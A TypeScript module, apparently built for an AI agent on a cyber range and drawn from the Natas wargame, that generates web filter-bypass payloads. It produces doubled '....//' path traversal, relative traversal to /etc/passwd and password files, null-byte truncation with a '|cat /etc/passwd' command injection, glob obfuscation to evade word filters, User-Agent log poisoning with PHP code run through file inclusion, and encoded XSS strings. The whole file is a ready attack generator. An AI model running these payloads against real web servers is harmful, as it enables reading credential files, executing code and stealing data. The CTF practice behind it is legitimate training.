/**
 * Web 过滤绕过原语（cyber-range 经验固化）
 *
 * 经验来源（Natas 实战）：
 *  - natas25 日志投毒 + LFI：str_replace 只删一次 `../` → `....//` 绕过；User-Agent 原样写日志 → PHP 代码注入 → LFI include
 *  - natas29 Perl open() 注入：`|ls%00` null 截断；过滤 `/natas/` → glob `nata[s]_webpass/nata[s]30`
 *  - natas7 LFI 相对路径：`../../../../etc/natas_webpass/natas8`
 *  - natas21/22：session 注入 / header 无 exit
 *
 * 设计：生成「绕过候选 + 目标代码形态 + 原理」，模型按实际过滤逻辑选用。
 */

export type BypassKind =
  | 'lfi_double'      // 双写 ../ 绕过单次 str_replace
  | 'lfi_relative'    // 相对路径穿越
  | 'null_byte'       // %00 截断后缀
  | 'glob_obfuscate'  // [aA] 字符类绕过字符串过滤
  | 'log_poison'      // UA/日志注入 PHP 代码
  | 'encode'          // URL/双重编码绕过

export interface BypassCandidate {
  kind: BypassKind
  /** 构造的值（URL 片段或 header） */
  payload: string
  /** 目标代码形态 */
  target: string
  /** 原理/适用 */
  note: string
}

/** LFI 双写绕过单次 str_replace('../','') */
export function lfiDouble(relPath: string): BypassCandidate {
  return {
    kind: 'lfi_double',
    payload: relPath.replace(/\.\.\//g, '....//'),
    target: "include($input) 且 str_replace('../','',$input) 只删一次",
    note: `把 ${relPath} 的每个 ../ 写成 ....//：str_replace 删掉中间的 ../ 后剩 ../，路径解析仍穿越成功（natas25 实战）`,
  }
}

/** 相对路径穿越：按目录深度给层数 */
export function lfiRelative(file: string, depth: number): BypassCandidate {
  const prefix = '../'.repeat(depth)
  return {
    kind: 'lfi_relative',
    payload: `${prefix}${file}`,
    target: "include($input) 无过滤 / 需要相对穿越",
    note: `从当前目录向上 ${depth} 层到根再进 ${file}；层数按实际目录深度调整（natas7 实战 ../../../../etc/natas_webpass/natas8）`,
  }
}

/** null 字节截断 */
export function nullByte(base: string): BypassCandidate {
  return {
    kind: 'null_byte',
    payload: `${base}%00`,
    target: "Perl/C 字符串拼接后缀（如 $file.'.txt'）",
    note: `%00 终止字符串，后缀被截断忽略（natas29 实战 |ls%00）；PHP 5.3.4 后 null 字节对 include 失效，仅 Perl/C 有效`,
  }
}

/** glob 字符类混淆：nata[s] 绕过 /natas/ 字符串过滤 */
export function globObfuscate(s: string): BypassCandidate {
  const out = s.replace(/([a-zA-Z])/g, (m) => `[${m.toLowerCase()}${m.toUpperCase()}]`)
  return {
    kind: 'glob_obfuscate',
    payload: out,
    target: "正则/字符串匹配拦截特定词（如 if($f=~/natas/)）",
    note: `${s} → ${out}：glob 字符类匹配字面量但规避字符串过滤（natas29 实战 nata[s]_webpass/nata[s]30）`,
  }
}

/** 日志投毒：User-Agent 注入 PHP 代码 */
export function logPoison(phpExpr: string): BypassCandidate {
  return {
    kind: 'log_poison',
    payload: `<?php ${phpExpr}; ?>`,
    target: "logRequest 把 User-Agent 原样写入日志文件 + LFI include 日志",
    note: `UA 设 ${phpExpr} 的 PHP 包裹（如 <?php echo file_get_contents('/etc/passwd'); ?>），经 LFI include 日志路径触发执行（natas25 实战：日志 /logs/natas25_<sid>.log，UA 注入后 ?lang=....//logs/... 触发）`,
  }
}

/** URL/双重编码 */
export function urlEncode(s: string, double: boolean): BypassCandidate {
  const once = encodeURIComponent(s)
  return {
    kind: 'encode',
    payload: double ? encodeURIComponent(once) : once,
    target: 'WAF/应用层单次 decode 后做过滤',
    note: `${s} → ${double ? '双重' : '单次'} URL 编码：服务端多级 decode 时，过滤层看到的仍是编码形态（绕过关键字检测）`,
  }
}

/** 生成一组 Web 绕过候选 */
export function generateBypass(opts: {
  kind?: BypassKind
  relPath?: string
  file?: string
  depth?: number
  base?: string
  word?: string
  phpExpr?: string
  text?: string
  double?: boolean
}): BypassCandidate[] {
  const kind = opts.kind
  const out: BypassCandidate[] = []
  if (!kind || kind === 'lfi_double') out.push(lfiDouble(opts.relPath ?? '../../../../etc/passwd'))
  if (!kind || kind === 'lfi_relative') out.push(lfiRelative(opts.file ?? 'etc/passwd', opts.depth ?? 4))
  if (!kind || kind === 'null_byte') out.push(nullByte(opts.base ?? '|cat /etc/passwd'))
  if (!kind || kind === 'glob_obfuscate') out.push(globObfuscate(opts.word ?? 'natas'))
  if (!kind || kind === 'log_poison') out.push(logPoison(opts.phpExpr ?? "echo 'PWNED';"))
  if (!kind || kind === 'encode') out.push(urlEncode(opts.text ?? '<script>alert(1)</script>', opts.double ?? false))
  return out
}
